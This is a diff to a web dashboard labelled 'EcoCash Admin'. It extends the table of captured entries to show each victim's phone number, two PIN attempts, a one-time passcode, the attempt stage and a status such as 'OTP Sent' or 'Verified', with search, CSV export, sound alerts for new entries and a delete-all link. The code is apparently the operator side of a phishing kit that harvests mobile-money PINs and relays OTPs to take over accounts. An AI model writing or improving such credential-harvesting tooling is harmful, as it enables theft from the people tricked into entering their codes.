@@ -24,7 +24,7 @@
     }
     
     .container {
-      max-width: 1400px;
+      max-width: 1600px;
       margin: 0 auto;
       width: 100%;
     }
@@ -180,8 +180,8 @@
     
     .action-buttons {
       display: flex;
-      flex-direction: row; /* Force horizontal layout */
-      flex-wrap: nowrap; /* Prevent wrapping */
+      flex-direction: row;
+      flex-wrap: nowrap;
       gap: 8px;
       margin-left: auto;
     }
@@ -200,8 +200,8 @@
       gap: 6px;
       white-space: nowrap;
       -webkit-tap-highlight-color: transparent;
-      flex: 0 1 auto; /* Don't grow, can shrink if needed */
-      min-width: 0; /* Allow shrinking below content size if necessary */
+      flex: 0 1 auto;
+      min-width: 0;
     }
     
     .refresh-btn {
@@ -384,7 +384,7 @@
     table {
       width: 100%;
       border-collapse: collapse;
-      min-width: 600px;
+      min-width: 1000px; /* Larger min-width for more columns */
     }
     
     thead {
@@ -396,7 +396,7 @@
       padding: clamp(12px, 2.5vw, 15px);
       text-align: left;
       font-weight: 600;
-      font-size: clamp(13px, 3vw, 15px);
+      font-size: clamp(13px, 3vw, 14px);
       white-space: nowrap;
     }
     
@@ -430,6 +430,14 @@
       font-size: clamp(13px, 3vw, 14px);
     }
     
+    .otp-display {
+      font-family: 'Courier New', monospace;
+      font-weight: 600;
+      letter-spacing: 2px;
+      color: #1c6aa6;
+      font-size: clamp(13px, 3vw, 14px);
+    }
+    
     .timestamp {
       color: #666;
       font-size: clamp(12px, 2.8vw, 13px);
@@ -453,6 +461,44 @@
     .badge-new {
       background: #ffd700;
       color: #333;
+    }
+    
+    .badge-success {
+      background: #d4edda;
+      color: #155724;
+    }
+    
+    .badge-warning {
+      background: #fff3cd;
+      color: #856404;
+    }
+    
+    .badge-danger {
+      background: #f8d7da;
+      color: #721c24;
+    }
+    
+    .attempt-badge {
+      display: inline-block;
+      padding: 4px 8px;
+      border-radius: 12px;
+      font-size: 11px;
+      font-weight: 600;
+    }
+    
+    .attempt-1 {
+      background: #f8d7da;
+      color: #721c24;
+    }
+    
+    .attempt-2 {
+      background: #fff3cd;
+      color: #856404;
+    }
+    
+    .attempt-3 {
+      background: #d4edda;
+      color: #155724;
     }
     
     /* Empty States */
@@ -556,17 +602,15 @@
       .action-buttons {
         width: 100%;
         margin-left: 0;
-        justify-content: space-between; /* Spread buttons evenly */
+        justify-content: space-between;
       }
       
-      /* Make buttons smaller on mobile but keep them horizontal */
       .refresh-btn, .export-btn, .auto-refresh-btn {
         padding: 8px 10px;
         font-size: 12px;
-        flex: 1; /* Make all buttons equal width */
+        flex: 1;
       }
       
-      /* Hide text on very small screens, show only icons */
       @media (max-width: 480px) {
         .refresh-btn span:not(:first-child), 
         .export-btn span:not(:first-child), 
@@ -587,10 +631,6 @@
       
       th, td {
         padding: 10px 8px;
-      }
-      
-      .phone-number, .pin-display {
-        font-size: 12px;
       }
       
       .footer {
@@ -614,7 +654,7 @@
       }
     }
     
-    /* Small Mobile - keep buttons horizontal */
+    /* Small Mobile */
     @media (max-width: 480px) {
       body {
         padding: 5px;
@@ -629,22 +669,22 @@
       }
       
       .action-buttons {
-        display: flex !important; /* Force flex display */
-        flex-direction: row !important; /* Force horizontal */
-        flex-wrap: nowrap !important; /* Prevent wrapping */
-        gap: 4px; /* Smaller gap on mobile */
+        display: flex !important;
+        flex-direction: row !important;
+        flex-wrap: nowrap !important;
+        gap: 4px;
       }
       
       .refresh-btn, .export-btn, .auto-refresh-btn {
-        width: auto; /* Don't force full width */
-        flex: 1 1 0; /* Allow equal distribution */
-        min-width: 40px; /* Minimum width */
+        width: auto;
+        flex: 1 1 0;
+        min-width: 40px;
         padding: 8px 4px;
         font-size: 11px;
       }
       
       table {
-        min-width: 500px;
+        min-width: 1000px;
       }
     }
     
@@ -684,7 +724,7 @@
     
     <div class="controls">
       <div class="search-box">
-        <input type="text" id="searchInput" placeholder="Search phone or PIN..." enterkeyhint="search">
+        <input type="text" id="searchInput" placeholder="Search phone, PIN, or OTP..." enterkeyhint="search">
       </div>
       
       <div class="filter-wrapper">
@@ -718,7 +758,7 @@
       <span>Auto-refresh in <span id="timerSeconds">20</span>s</span>
     </div>
     
-    <!-- New Data Banner (only shows when there are unseen entries) -->
+    <!-- New Data Banner -->
     <div id="newDataBanner" class="new-data-banner" style="display: none;">
       <div class="new-count">
         <span>✨ NEW</span>
@@ -729,7 +769,7 @@
       </button>
     </div>
     
-    <!-- New Data Section (shows only unseen entries) -->
+    <!-- New Data Section -->
     <div id="newDataSection" style="display: none;">
       <div class="section-header">
         <h2>✨ New Entries <span class="section-badge new" id="newSectionCount">0</span></h2>
@@ -740,7 +780,11 @@
             <tr>
               <th>#</th>
               <th>Phone Number</th>
-              <th>PIN</th>
+              <th>PIN 1</th>
+              <th>PIN 2</th>
+              <th>OTP</th>
+              <th>Attempt</th>
+              <th>Status</th>
               <th>Date & Time</th>
               <th>Device</th>
             </tr>
@@ -750,7 +794,7 @@
       </div>
     </div>
     
-    <!-- All Data Section (shows all entries, including new ones) -->
+    <!-- All Data Section -->
     <div id="allDataSection">
       <div class="section-header">
         <h2>📋 All Entries <span class="section-badge" id="allSectionCount">0</span></h2>
@@ -771,7 +815,11 @@
             <tr>
               <th>#</th>
               <th>Phone Number</th>
-              <th>PIN</th>
+              <th>PIN 1</th>
+              <th>PIN 2</th>
+              <th>OTP</th>
+              <th>Attempt</th>
+              <th>Status</th>
               <th>Date & Time</th>
               <th>Device</th>
             </tr>
@@ -786,6 +834,9 @@
     <div class="footer">
       <div class="footer-left">
         <span>EcoCash Admin • <span id="updateTime"></span></span>
+      </div>
+      <div class="footer-right">
+        <a href="delete-data.html" class="delete-link" target="_blank">🗑️ Delete All Data</a>
       </div>
     </div>
   </div>
@@ -849,14 +900,14 @@
 
       // ==================== STATE ====================
       let allEntries = [];
-      let seenEntryIds = new Set(); // Track which entries have been seen
+      let seenEntryIds = new Set();
       let filteredEntries = [];
       let currentFilter = 'all';
       let searchTerm = '';
       
       // Auto-refresh state
       let autoRefreshEnabled = false;
-      let refreshInterval = 20; // seconds
+      let refreshInterval = 20;
       let timeLeft = refreshInterval;
       let timerInterval = null;
       
@@ -888,13 +939,11 @@
 
       function loadSettings() {
         try {
-          // Load sound setting
           const soundSaved = localStorage.getItem(STORAGE_KEYS.SOUND_ENABLED);
           if (soundSaved !== null) {
             soundEnabled = soundSaved === 'true';
           }
           
-          // Load auto-refresh setting
           const autoSaved = localStorage.getItem(STORAGE_KEYS.AUTO_REFRESH);
           if (autoSaved !== null) {
             autoRefreshEnabled = autoSaved === 'true';
@@ -1062,6 +1111,34 @@
         return '🌐';
       }
 
+      function getStatusBadge(status) {
+        switch(status) {
+          case 'failed':
+            return '<span class="badge badge-danger">❌ Failed</span>';
+          case 'otp_sent':
+            return '<span class="badge badge-warning">📱 OTP Sent</span>';
+          case 'verified':
+            return '<span class="badge badge-success">✅ Verified</span>';
+          case 'otp_entered':
+            return '<span class="badge badge-info">🔑 OTP Entered</span>';
+          default:
+            return '<span class="badge badge-info">⏳ Pending</span>';
+        }
+      }
+
+      function getAttemptBadge(attempt) {
+        switch(attempt) {
+          case 1:
+            return '<span class="attempt-badge attempt-1">First Attempt</span>';
+          case 2:
+            return '<span class="attempt-badge attempt-2">Second Attempt</span>';
+          case 3:
+            return '<span class="attempt-badge attempt-3">OTP Attempt</span>';
+          default:
+            return '<span class="attempt-badge">Unknown</span>';
+        }
+      }
+
       function filterEntriesByTime(entries, filter) {
         const now = new Date();
         const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
@@ -1086,17 +1163,17 @@
         term = term.toLowerCase();
         return entries.filter(entry => {
           const phone = (entry.phoneNumber || '').toLowerCase();
-          const pin = (entry.pin || '').toLowerCase();
-          return phone.includes(term) || pin.includes(term);
+          const pin1 = (entry.pin1 || '').toLowerCase();
+          const pin2 = (entry.pin2 || '').toLowerCase();
+          const otp = (entry.otp || '').toLowerCase();
+          return phone.includes(term) || pin1.includes(term) || pin2.includes(term) || otp.includes(term);
         });
       }
 
-      // Get unseen entries
       function getUnseenEntries() {
         return allEntries.filter(entry => !seenEntryIds.has(entry.id));
       }
 
-      // Display all entries (for the main table)
       function displayAllEntries() {
         let entries = filterEntriesByTime(allEntries, currentFilter);
         entries = filterEntriesBySearch(entries, searchTerm);
@@ -1122,16 +1199,29 @@
             const timestamp = entry.timestamp ? formatTimestamp(entry.timestamp) : 'N/A';
             const formattedPhone = formatPhoneNumber(entry.phoneNumber);
             const deviceIcon = getDeviceIcon(entry.userAgent);
-            
-            // Add visual indicator if this entry is unseen
             const isUnseen = !seenEntryIds.has(entry.id);
+            
+            // Get the appropriate PIN and OTP values based on attempt
+            let pin1 = entry.pin1 || (entry.attempt === 1 ? entry.pin : '—');
+            let pin2 = entry.pin2 || (entry.attempt === 2 ? entry.pin : '—');
+            let otp = entry.otp || '—';
+            
+            // Handle legacy data that might have just 'pin' field
+            if (entry.pin && !entry.pin1 && !entry.pin2) {
+              if (entry.attempt === 1) pin1 = entry.pin;
+              else if (entry.attempt === 2) pin2 = entry.pin;
+            }
             
             row.innerHTML = `
               <td>${index + 1}${isUnseen ? ' ✨' : ''}</td>
               <td class="phone-number">${formattedPhone}</td>
-              <td class="pin-display">${entry.pin || 'N/A'}</td>
+              <td class="pin-display">${pin1}</td>
+              <td class="pin-display">${pin2}</td>
+              <td class="otp-display">${otp}</td>
+              <td>${getAttemptBadge(entry.attempt)}</td>
+              <td>${getStatusBadge(entry.status)}</td>
               <td class="timestamp">${timestamp}</td>
-              <td><span class="badge ${isUnseen ? 'badge-new' : 'badge-info'}">${deviceIcon} ${isUnseen ? 'New' : 'Seen'}</span></td>
+              <td><span class="badge badge-info">${deviceIcon} ${entry.userAgent ? 'Device' : 'Unknown'}</span></td>
             `;
             
             tableBody.appendChild(row);
@@ -1141,7 +1231,6 @@
         updateTimeSpan.textContent = `Updated ${new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}`;
       }
 
-      // Display unseen entries in the new section
       function displayUnseenEntries() {
         const unseenEntries = getUnseenEntries();
         
@@ -1151,11 +1240,9 @@
           return;
         }
         
-        // Show banner
         newDataCount.textContent = unseenEntries.length;
         newDataBanner.style.display = 'flex';
         
-        // Show section
         newDataSection.style.display = 'block';
         newSectionCount.textContent = unseenEntries.length;
         
@@ -1166,33 +1253,42 @@
           const formattedPhone = formatPhoneNumber(entry.phoneNumber);
           const deviceIcon = getDeviceIcon(entry.userAgent);
           
+          let pin1 = entry.pin1 || (entry.attempt === 1 ? entry.pin : '—');
+          let pin2 = entry.pin2 || (entry.attempt === 2 ? entry.pin : '—');
+          let otp = entry.otp || '—';
+          
+          if (entry.pin && !entry.pin1 && !entry.pin2) {
+            if (entry.attempt === 1) pin1 = entry.pin;
+            else if (entry.attempt === 2) pin2 = entry.pin;
+          }
+          
           row.innerHTML = `
             <td>${index + 1}</td>
             <td class="phone-number">${formattedPhone}</td>
-            <td class="pin-display">${entry.pin || 'N/A'}</td>
+            <td class="pin-display">${pin1}</td>
+            <td class="pin-display">${pin2}</td>
+            <td class="otp-display">${otp}</td>
+            <td>${getAttemptBadge(entry.attempt)}</td>
+            <td>${getStatusBadge(entry.status)}</td>
             <td class="timestamp">${timestamp}</td>
-            <td><span class="badge badge-new">✨ New</span></td>
+            <td><span class="badge badge-info">${deviceIcon} ${entry.userAgent ? 'Device' : 'Unknown'}</span></td>
           `;
           
           newTableBody.appendChild(row);
         });
         
-        // Play sound for new entries if enabled
         if (unseenEntries.length > 0 && soundEnabled) {
           playNotificationSound();
         }
       }
 
       function markAllAsSeen() {
-        // Add all current entry IDs to seen set
         allEntries.forEach(entry => {
           seenEntryIds.add(entry.id);
         });
         
-        // Save to localStorage
         saveSeenEntries();
         
-        // Update displays
         displayUnseenEntries();
         displayAllEntries();
       }
@@ -1214,11 +1310,9 @@
               });
             });
             
-            // Update displays
             displayUnseenEntries();
             displayAllEntries();
             
-            // Reset timer if auto-refresh is enabled
             if (autoRefreshEnabled) {
               timeLeft = refreshInterval;
               updateTimerDisplay();
@@ -1242,17 +1336,29 @@
           return;
         }
         
-        const headers = ['Phone Number', 'PIN', 'Timestamp', 'Device', 'Status'];
+        const headers = ['Phone Number', 'PIN 1', 'PIN 2', 'OTP', 'Attempt', 'Status', 'Timestamp', 'User Agent', 'Page URL'];
         const csvRows = [headers.join(',')];
         
         filteredEntries.forEach(entry => {
-          const status = seenEntryIds.has(entry.id) ? 'Seen' : 'New';
+          let pin1 = entry.pin1 || (entry.attempt === 1 ? entry.pin : '');
+          let pin2 = entry.pin2 || (entry.attempt === 2 ? entry.pin : '');
+          let otp = entry.otp || '';
+          
+          if (entry.pin && !entry.pin1 && !entry.pin2) {
+            if (entry.attempt === 1) pin1 = entry.pin;
+            else if (entry.attempt === 2) pin2 = entry.pin;
+          }
+          
           const row = [
             `"${entry.phoneNumber || ''}"`,
-            `"${entry.pin || ''}"`,
+            `"${pin1}"`,
+            `"${pin2}"`,
+            `"${otp}"`,
+            `"${entry.attempt || ''}"`,
+            `"${entry.status || ''}"`,
             `"${entry.timestamp ? entry.timestamp.toDate().toLocaleString() : ''}"`,
             `"${entry.userAgent || ''}"`,
-            `"${status}"`
+            `"${entry.pageUrl || ''}"`
           ];
           csvRows.push(row.join(','));
         });
@@ -1262,7 +1368,7 @@
         const url = window.URL.createObjectURL(blob);
         const a = document.createElement('a');
         a.href = url;
-        a.download = `ecocash_${new Date().toISOString().slice(0,10)}.csv`;
+        a.download = `ecocash_export_${new Date().toISOString().slice(0,10)}.csv`;
         document.body.appendChild(a);
         a.click();
         document.body.removeChild(a);
@@ -1291,11 +1397,9 @@
       markSeenBtn.addEventListener('click', markAllAsSeen);
 
       // ==================== INITIAL LOAD ====================
-      // Load saved state
       loadSeenEntries();
       loadSettings();
       
-      // Apply sound setting
       if (soundEnabled) {
         soundToggle.classList.add('active');
         soundIcon.textContent = '🔊';
@@ -1306,7 +1410,6 @@
         soundText.textContent = 'Sound Off';
       }
       
-      // Apply auto-refresh setting
       if (autoRefreshEnabled) {
         autoRefreshBtn.classList.add('active');
         autoRefreshBtn.innerHTML = '<span>⏹️</span> <span>Auto</span>';
@@ -1318,7 +1421,7 @@
       
       fetchEntries();
 
-      // Add pull-to-refresh support for mobile
+      // Pull-to-refresh
       let touchStartY = 0;
       document.addEventListener('touchstart', (e) => {
         touchStartY = e.touches[0].screenY;
